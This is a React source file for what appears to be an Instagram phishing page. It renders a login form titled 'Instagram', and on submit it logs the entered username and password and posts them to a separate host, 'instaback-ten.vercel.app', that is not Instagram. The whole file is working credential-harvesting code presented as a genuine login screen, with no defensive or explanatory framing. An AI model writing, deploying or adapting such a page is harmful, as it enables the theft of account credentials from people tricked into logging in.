import React, { useState } from 'react';
import axios from 'axios';


function App() {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');


  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      console.log(username, password)
      const response = await axios.post('https://instaback-ten.vercel.app/', { username, password });
      console.log(response.data);
    } catch (error) {
      console.error(error);
    }
  };

  return (
    <div className="flex justify-center items-center h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg">
        <h1 className="text-4xl font-bold text-center mb-8">Instagram</h1>
        <form onSubmit={handleSubmit}>
          <div className="mb-4">
            <input
              type="text"
              id="username"
              name="username"
              placeholder="Username"
              className="mt-1 p-2 w-full border rounded-md"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              id="password"
              name="password"
              placeholder="Password"
              className="mt-1 p-2 w-full border rounded-md"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          <button type="submit" className="w-full bg-blue-500 text-white py-2 rounded-md">Log In</button>
        </form>
        <div className="mt-4">
          <p className="text-sm text-center">Don't have an account? <a href="#" className="text-blue-500">Sign up</a></p>
        </div>
      </div>
    </div>
  );
}

export default App;
